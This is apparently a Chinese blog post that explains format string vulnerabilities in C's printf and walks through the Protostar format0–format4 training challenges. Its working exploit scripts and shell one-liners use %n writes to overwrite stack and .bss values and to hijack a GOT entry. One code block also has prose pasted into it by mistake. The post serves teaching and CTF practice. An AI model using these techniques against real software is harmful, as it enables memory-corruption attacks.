---
title: 浅析格式化字符串漏洞
categories:
  - linux_pwn
tags:
  - Null
---

这几天在准备技能大赛，由于这次可能会用到 `格式化字符串` 漏洞，所以在我又重新复习了一边格式化字符串漏洞，在这里做一个简单记录。

# 0x1 漏洞原理

在这里我们就不赘述格式化字符串具体是什么了，我们直接从 `C` 中的用法来具体分析。



## 1. C 中的 printf

在 `C` 语言中具体的使用语法为：

`%[*parameter*][*flags*][*field width*][.*precision*][*length*]*type*`

在这里我们主要简单介绍 `parameter` 、`Flags` 、`field width` 、`type` 这几个我们在 `pwn` 中常使用到的 `格式化占位符` 和类型，具体的的使用方法介绍可以在 [**这里**](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2) 找到。



### 1）格式化占位符

#### **Parameter** 可以忽略或者是：

| 字符 |                             描述                             |
| :--: | :----------------------------------------------------------: |
| `n$` | *n*是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了*parameter*，则其他所有占位符必须也使用*parameter*。 |

这个占位符主要在最后对具体位置进行定位的时候使用到，可以快速定位以及减少输出不必要的信息。



#### **Flags** 可为0个或多个：

| 字符 |                             描述                             |
| :--: | :----------------------------------------------------------: |
| `0`  | 如果*width*选项前缀以`0`，则在左侧用`0`填充直至达到宽度要求。例如`printf("%2d", 3)`输出"` 3`"，而`printf("%02d", 3)`输出"`03`"。如果`0`与`-`均出现，则`0`被忽略，即左对齐依然用空格填充。 |

在这里我们在 `Flags` 当中最常用的就是 `0` ，其他的就不做过多的介绍了。



#### Field Width

给出显示数值的最小宽度，典型用于制表输出时填充固定宽度的表目。实际输出字符的个数不足域宽，则根据左对齐或右对齐进行填充。实际输出字符的个数超过域宽并不引起数值截断，而是显示全部。宽度值的前导0被解释为0填充标志。



### 2）类型

**Type**，也称转换说明（conversion specification/specifier），我们常用的是：

|   字符   |                             描述                             |
| :------: | :----------------------------------------------------------: |
| `x`, `X` | 16进制`unsigned int`。'`x`'使用小写字母；'`X`'使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。 |
|   `s`    | 如果没有用l标志，输出[null结尾字符串](https://zh.wikipedia.org/w/index.php?title=Null%E7%BB%93%E5%B0%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&action=edit&redlink=1)直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用`wcrtomb`函数。 |
|   `c`    | 如果没有用l标志，把int参数转为`unsigned char`型输出；如果用了l标志，把wint_t参数转为包含两个元素的`wchart_t`数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。 |
|   `n`    | 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 |

在我们的漏洞利用过程中，我们主要用 `x` 对齐字节和找到我们传入的地址，用 `n` 修改对应地址所对应的值， `c` 可以控制 `n` 写的值，`s` 用来泄露栈上空间的内容。



# 0x2 漏洞利用

在前面的内容中，我们简单的介绍了一下漏洞的基本原理，接下来，我会从具体的程序中找到漏洞的利用方法。



## 1. protostar_format writeup

原恒星上面的的题目都很基础，所以我决定，从这里开始。

下面这几个文件并没有开启任何保护，所以在检查的部分，就不赘述了。

### 1）format 0

日常 `ida` 打开，发现 `main` 函数中将 `argv[1]` 作为参数并调用了 `vuln` 函数，我们跟进：

![protostar_format0_2](/image/2019-03-20-linux_pwn_format/protostar_format0_2.png)

在这里很容易就发现了该文件的漏洞点，通过从 `sprintf` 将 `argv[1]` 的值写入到 `s` 中。

在这里有一个很简单的栈溢出漏洞，直接进行栈溢出将 `var_c` 覆盖为 `0xDEADBEEF` 。

`poc`：

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
import struct, subprocess


def main():
    payload = b"a"*0x40 + struct.pack('<I', 0xDEADBEEF)
    subprocess.Popen(['./format0', payload])


if __name__ == '__main__':
    main()
```



### 2）format 1

和上面一样，同样是通过 `main` 函数中将 `argv[1]` 作为参数并调用了 `vuln` 函数，直接看 `vuln` ：

![protostar_format1_1](/image/2019-03-20-linux_pwn_format/protostar_format1_1.png)

这里将 `argv[1]` 的值直接传入到 `printf` 中，我们需要做的就是将 .`bss` 上的 `target` 覆盖为任意不为 `0` 的值 ，就可以通过这个挑战了。

通过

```sh
./format1 `python -c "print 'a'*6 + '%08x.'*200"`
在一连串的数据中通过.来定位，我这里通过

刚好可以定位到 08049638（target）的地址，直接将 x 改成 n ，就可以将 target 地址的值改掉了。
```

在一连串的数据中通过 `.` 来定位，我这里通

```sh
./format1 `python -c "print ‘\x38\x96\x04\x08’ + 'a'*4 + '%183$x'"`
```

我这里的定位到 `183` 就刚好可以输出 `08049638（target）`的地址，这里直接将参数 `x` 改成参数 `n` ，就可以将 `target` 的值改掉啦！

`poc` :

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
import struct, subprocess


def main():
    target = struct.pack('<I', 0x08049638)
    payload = target + b'a'*4 + b'%183$n'
    subprocess.Popen(['./format1', payload])


if __name__ == '__main__':
    main()
```



### 3）format 2

这里的 `main` 函数直接调用 `vuln` 函数，我们直接看：

![protostar_format2_1](/image/2019-03-20-linux_pwn_format/protostar_format2_1.png)

简单分析一下，通过 `fgets` 函数将 `stdin` 的输入值写到 `s` 处，由于 `fgets` 限制了读取长度，所以这里并没有栈溢出。下面和 `format 1` 同样的流程，只不过这里要将 `target` 更改为具体的数值 `0x40`。

首先，同样的操作。

```sh
python -c "print b'a'*6 + b'%08x.'*100" | ./format2
```

由于执行 `printf` 时候的栈地址，和 `s` 比较接近，所以我们很快就定位了。

```sh
python -c "print b'\xE4\x96\x04\x08' + b'%4$x'" | ./format2
```

我们先尝试一下直接将参数 `x` 换位 `n` ，

```sh
python -c "print b'\xE4\x96\x04\x08' + b'%4$n'" | ./format2
```

这个时候我们得到了 `target` 回显：

```sh
target is 4 :(
```

我们成功将 `target` 改为了 `4` ，由于之前介绍过了，这里我们直接用 `c` 参数进行一个数据填充。

```sh
python -c "print b'\xE4\x96\x04\x08' + b'%60c' + b'%4$n'" | ./format2
```

到这里，又一次成功的拿到了 `flag`



本来是不打算用 `pwntools`， 但是需要交互，还是这个写着快一点。

`poc` :

```python
# /usr/env/bin python
# -*- coding: utf-8 -*-

from pwn import *


def main():
    target = p32(0x080496E4)
    payload = target + b'%60c' + b'%4$n'
    exp_file = process('./format2')
    exp_file.sendline(payload)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



### 4）format 3

直接看 `vuln` ：

![protostar_format3_1](/image/2019-03-20-linux_pwn_format/protostar_format3_1.png)

这里整体和 `format 2` 基本是一致的，所以那些定位就不赘述了。

这里要将 `target` 改为具体值 `0x01025544` , 我们需要从 `target` 的低地址开始写入。

```sh
python -c "print b'\xF4\x96\x04\x08' + b'\xF5\x96\x04\x08' + b'\xF6\x96\x04\x08' + b'\xF7\x96\x04\x08' + b'%52c' + b'%12$n' + b'%13$n' + b'%14$n' + b'%15$n'" | ./format3
```

这里我们相当于是将整个 `target` 的值改为 `0x44444444`, 接下来我们需要改 `0x080496F5` 的值了。

```sh
python -c "print b'\xF4\x96\x04\x08' + b'\xF5\x96\x04\x08' + b'\xF6\x96\x04\x08' + b'\xF7\x96\x04\x08' + b'%52c' + b'%12$n' + b'%17c' + b'%13$n' + b'%14$n' + b'%15$n'" | ./format3
```

由于 `0x44` 到 `0x55` 只需要 `0x11` 个字节，所以，我们直接在第一个参数 `n` 后面 `%17c` 即可， 现在 `target`的值相当于改为 `0x55555544`。

由于 `0x55` 大于 `0x02` 的，因为 `n` 写入值，相当于是在做 `加法` 所以我们直接让 `0x02` 借一位，变成 `0x102`, 那这个问题就迎刃而解了，这里虽然是做 `加法` 但是实际并不会进一位，所以现在的 `target` 为 `0x02025544`

```sh
python -c "print b'\xF4\x96\x04\x08' + b'\xF5\x96\x04\x08' + b'\xF6\x96\x04\x08' + b'\xF7\x96\x04\x08' + b'%52c' + b'%12$n' + b'%17c' + b'%13$n' + b'%173c' + b'%14$n' + b'%15$n'" | ./format3
```

与刚才的 `0x55` 到 `0x02` 一致，所以这次依然借一位，至此得到了 `flag`

`poc` ：

```python
# /usr/env/bin python
# -*- coding: utf-8 -*-

from pwn import *


def main():
    target = []
    for nums in range(4):
        target.append(struct.pack('<I', 0x080496F4+nums))
    payload = b''.join(target) + b'%52c' + b'%12$n' + b'%17c' + b'%13$n' + b'%173c' + b'%14$n' + b'%255c' + b'%15$n'
    exp_file = process('/home/who/Desktop/protostar/format3')
    exp_file.sendline(payload)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



### 5）format 4

依旧直接看 `vuln` :

![protostar_format4_1](/image/2019-03-20-linux_pwn_format/protostar_format4_1.png)

这里在 `vuln` 中并没有找到 `flag` ，这个时候发现了一个 `hello` 函数

![protostar_format4_1](/image/2019-03-20-linux_pwn_format/protostar_format4_1-1553014781021.png)

到这里就很明白了，通过 `printf` 更改 `got` 表中 `exit` 所对应的值为 `hello` 函数。

这样，在执行 `exit` 的时候，将通过 `plt` 表在跳转到 `hello` 函数。

因为接下来都是很正常的操作了，所以，直接放 `poc` 了

`poc` ：

```python
# /usr/env/bin python
# -*- coding: utf-8 -*-

from pwn import *


def main():
    exit_got_addr = []
    for nums in range(4):
        exit_got_addr.append(struct.pack('<I', 0x08049724+nums))
    payload = b''.join(exit_got_addr) + b'%164c' + b'%4$n' + b'%208c' + b'%5$n' + b'%128c' + b'%6$n' + b'%4c' + b'%7$n'
    exp_file = process('/home/who/Desktop/protostar/format4')
    exp_file.sendline(payload)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



## 未完待续。。。

未完待续。。。



# 0x3 Reference

[https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2)

[https://www.cnblogs.com/prayer521/p/6139424.html](https://www.cnblogs.com/prayer521/p/6139424.html)